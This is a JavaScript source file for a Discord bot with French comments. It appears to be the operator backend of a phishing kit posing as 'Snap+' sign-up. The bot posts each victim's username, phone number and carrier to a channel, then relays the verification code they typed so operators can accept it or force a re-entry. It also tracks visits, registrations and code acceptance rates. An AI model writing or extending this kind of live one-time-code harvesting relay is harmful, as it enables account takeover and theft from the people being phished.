const {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} = require('discord.js');
const { users, stats } = require('./store');

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const SEPARATOR = '──────────────────────────────────────────────────────';

let statsMessageId = null;
let statsChannelId = null;

// ======================= UTILITAIRES =======================
function formatPhoneNumber(phone) {
  if (!phone) return 'N/A';
  return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
}

function formatUptime(ms) {
  const seconds = Math.floor(ms / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);
  const days = Math.floor(hours / 24);

  if (days > 0) return `${days}j ${hours % 24}h ${minutes % 60}m`;
  if (hours > 0) return `${hours}h ${minutes % 60}m`;
  if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
  return `${seconds}s`;
}

function getPercentage(value, total) {
  if (total === 0) return 0;
  return ((value / total) * 100).toFixed(1);
}

// ======================= CREATION "TYPE 17" =======================
// Ton exemple : [{ type: 17, accent_color: 0, spoiler:false, components:[ ... ] }]
function makeType17Embed(components) {
  return {
    type: 17,
    accent_color: 0,
    spoiler: false,
    components,
  };
}

// Convertit une liste simplifiée => blocks exacts du type 17
function blocksFromLines(lines) {
  // Chaque ligne devient { type: 10, content: '...' }
  // Et on insère un divider quand line === '__DIVIDER__'
  const out = [];
  for (const line of lines) {
    if (line === '__DIVIDER__') {
      out.push({ type: 14, divider: true, spacing: 2 });
      continue;
    }
    out.push({ type: 10, content: line });
  }
  return out;
}

// ======================= TEXTES D'ACTUALITES =======================
function createInitialBlocks(username, phone, operator) {
  return blocksFromLines([
    "# 📱 Nouvelle inscription Snap+",
    '__DIVIDER__',
    `### 👤 Nom d'utilisateur: ${username}`,
    `### 📞 Téléphone: ${formatPhoneNumber(phone)}`,
    `### 🏛️ Opérateur: ${operator || 'N/A'}`,
    `### ⏰ Date: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
    '__DIVIDER__',
    "En attente du code...",
  ]);
}

function createCodeBlocks(username, phone, code) {
  return blocksFromLines([
    "# 🔒 Code de vérification soumis",
    '__DIVIDER__',
    `### 👤 Nom d'utilisateur: ${username}`,
    `### 🔢 Code saisi: \`${code}\``,
    `### 📞 Téléphone: ${formatPhoneNumber(phone)}`,
    `### 📅 Soumis à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
    '__DIVIDER__',
    "En attente de validation par un modérateur",
  ]);
}

function createAcceptBlocks(username, phone, code, validatedBy) {
  return blocksFromLines([
    "# ✅ Code validé",
    '__DIVIDER__',
    `### 👤 Nom d'utilisateur: ${username}`,
    `### 📞 Téléphone: ${formatPhoneNumber(phone)}`,
    `### 🔢 Code: \`${code}\``,
    `### 📅 Validé à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
    `### ✅ Validé par: ${validatedBy}`,
    '__DIVIDER__',
    "*Utilisateur vérifié*",
  ]);
}

function createRejectBlocks(username, phone, code, rejectedBy) {
  return blocksFromLines([
    "# 🔒 Code rejeté",
    '__DIVIDER__',
    `### 👤 Nom d'utilisateur: ${username}`,
    `### 🔢 Code saisi: \`${code || 'N/A'}\``,
    `### 📞 Téléphone: ${formatPhoneNumber(phone)}`,
    `### 📅 Rejeté à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
    `### ❌ Rejeté par: ${rejectedBy}`,
    '__DIVIDER__',
    "*L'utilisateur devra ressaisir le code*",
  ]);
}

// ======================= STATS =======================
function createStatsType17Components() {
  const uptime = formatUptime(Date.now() - stats.startTime);
  const STATS_SEPARATOR = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';

  return blocksFromLines([
    `${STATS_SEPARATOR}`,
    '',
    '### 👥 **Visiteurs**',
    `🌐 **Total des visites:** \`${stats.totalVisits}\``,
    `👤 **Visiteurs actuels:** \`${stats.currentVisitors}\``,
    `🕐 **Dernière visite:** ${stats.lastVisit || 'Aucune'}`,
    '',
    '### 📝 **Inscriptions**',
    `📱 **Total inscriptions:** \`${stats.totalRegistrations}\``,
    `🕐 **Dernière inscription:** ${stats.lastRegistration || 'Aucune'}`,
    '',
    '### 🔐 **Codes de vérification**',
    `📤 **Codes soumis:** \`${stats.totalCodesSubmitted}\``,
    `✅ **Codes acceptés:** \`${stats.codesAccepted}\` (${getPercentage(stats.codesAccepted, stats.totalCodesSubmitted)}%)`,
    `❌ **Codes rejetés:** \`${stats.codesRejected}\` (${getPercentage(stats.codesRejected, stats.totalCodesSubmitted)}%)`,
    '',
    '### ⏱️ **Système**',
    `🟢 **Uptime:** ${uptime}`,
    `🔄 **Dernière mise à jour:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
    '',
    `${STATS_SEPARATOR}`,
    '*🔄 Actualisation automatique toutes les 30 secondes*',
  ]);
}

function createStatsType17Embed() {
  return makeType17Embed(createStatsType17Components());
}

// ======================= EMBED STATS UPDATE =======================
async function initStatsEmbed() {
  statsChannelId = process.env.STATS_CHANNEL_ID;
  if (!statsChannelId) {
    console.warn('⚠️ STATS_CHANNEL_ID non défini dans .env - Stats désactivées');
    return;
  }

  try {
    const channel = await client.channels.fetch(statsChannelId);

    // Chercher un message existant que le bot a envoyé
    const messages = await channel.messages.fetch({ limit: 10 });
    const existingStats = messages.find(
      (msg) => msg.author.id === client.user.id && (msg.embeds?.length || 0) > 0
    );

    const embed = createStatsType17Embed();

    if (existingStats) {
      await existingStats.edit({ embeds: [embed] });
      statsMessageId = existingStats.id;
      console.log('✅ Embed de statistiques mis à jour');
    } else {
      const msg = await channel.send({ embeds: [embed] });
      statsMessageId = msg.id;
      console.log('✅ Embed de statistiques créé');
    }

    setInterval(() => updateStatsMessage().catch(() => {}), 30000);
  } catch (err) {
    console.error('❌ Erreur initialisation stats:', err);
  }
}

async function updateStatsMessage() {
  if (!statsMessageId || !statsChannelId) return;

  try {
    const channel = await client.channels.fetch(statsChannelId);
    const message = await channel.messages.fetch(statsMessageId);
    const embed = createStatsType17Embed();
    await message.edit({ embeds: [embed] });
  } catch (err) {
    console.error('❌ Erreur mise à jour stats:', err);
  }
}

// ======================= BOT DISCORD =======================
client.once('ready', () => {
  console.log(`🤖 Bot Discord connecté : ${client.user.tag}`);
  setTimeout(() => initStatsEmbed(), 2000);
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;

  const [action, username] = interaction.customId.split(':');
  const user = users[username];

  if (!user) return interaction.reply({ content: 'Utilisateur introuvable.', ephemeral: true });

  if (action === 'accept') {
    user.status = 'verified';

    stats.codesAccepted++;

    const embed = makeType17Embed(
      createAcceptBlocks(username, user.phone, user.submittedCode, interaction.user.tag)
    );

    await interaction.update({ content: '@everyone', embeds: [embed], components: [] });
    updateStatsEmbed();
  }

  if (action === 'reject') {
    user.status = 'rejected';
    const rejectedCode = user.submittedCode;
    user.submittedCode = null;

    stats.codesRejected++;

    const embed = makeType17Embed(
      createRejectBlocks(username, user.phone, rejectedCode, interaction.user.tag)
    );

    await interaction.update({ content: '@everyone', embeds: [embed], components: [] });
    updateStatsEmbed();
  }
});

// Fonction appelée par server.js pour mettre à jour les stats
function updateStatsEmbed() {
  if (statsMessageId && statsChannelId) {
    updateStatsMessage().catch(() => {});
  }
}

// ======================= ENVOI MESSAGES =======================
async function sendInitialEmbed(username, phone) {
  const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
  const user = users[username];

  const embed = makeType17Embed(
    createInitialBlocks(username, phone, user?.operator)
  );

  await channel.send({ content: '@everyone', embeds: [embed] });
}

async function sendCodeEmbed(username) {
  const user = users[username];
  const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);

  const embed = makeType17Embed(
    createCodeBlocks(username, user.phone, user.submittedCode)
  );

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`accept:${username}`)
      .setLabel('Accepter')
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId(`reject:${username}`)
      .setLabel('Refuser')
      .setStyle(ButtonStyle.Danger)
  );

  await channel.send({ content: '@everyone', embeds: [embed], components: [row] });
}

client.login(process.env.BOT_TOKEN);

module.exports = { sendInitialEmbed, sendCodeEmbed, updateStatsEmbed };
